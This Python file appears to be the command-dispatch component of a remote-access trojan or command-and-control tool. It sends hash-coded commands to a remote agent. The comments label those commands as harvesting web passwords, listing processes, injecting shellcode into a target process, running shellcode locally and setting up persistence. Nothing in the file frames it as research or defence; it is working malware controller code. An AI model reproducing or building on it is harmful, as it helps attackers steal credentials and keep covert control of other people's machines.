from Tools.toolsF import *
import json



class CommandManager(object):

    def __init__(self,writer, reader):
        self.writer = writer
        self.reader = reader
        self.waitingForResult = False
        self.tag = "root"
     
    def retriveCommand(self, message:dict):
        command = message.get("command")
        self.waitingForResult = command is not None and len(command) > 0
        if not self.waitingForResult: 
            return
        if command == "5df297c2f2da83a8b45cfd012fbf9b3c": #Web passwords
            command = gen_xml(self.tag, command=command, type=message.get("type"),web=message.get("web")) 
            self.writer(command.encode())
            return collect(json.loads(self.reader().decode(errors='replace')))
        if command == "be425fd08e9ea24230bac47493228ada": #List process Info
            self.writer(gen_xml(self.tag, command=command).encode())
            return json.loads(self.reader().decode(errors='replace'))
        if command == "aea87b24517d08c8ff13601406a0202e": #Inject a process
            self.writer(gen_xml(self.tag, command=command, shellonbase=message.get("shellonbase"), targetPid=message.get("targetPid")).encode())
            status = str(self.reader().decode(errors='replace').strip())
            return tryParse(int, status ,1) == 0
        if command == "2dbab3bcba2fe64f1d2133bc50796496": #Run local shell code
            self.writer(gen_xml(self.tag, command=command, shellonbase=message.get("shellonbase")).encode())
            status = self.reader().decode(errors='replace').strip()
            return tryParse(int, status, 1) == 0
        if command == "e5fcfe07178a109ea0c1e9bd7e9dd772": #Persistence
            self.writer(gen_xml(self.tag, **message).encode())
            status = self.reader().decode(errors='replace').strip()
            return tryParse(int, status, 1) == 0

        command = gen_xml(self.tag, command=command)
        self.writer(command.encode())
        return self.reader().decode(errors='replace')
       
    def isValid(self,*args) -> bool:
        for i in args:
            if i == None:
                return False
        return True
    
    
        
    
    
        

            
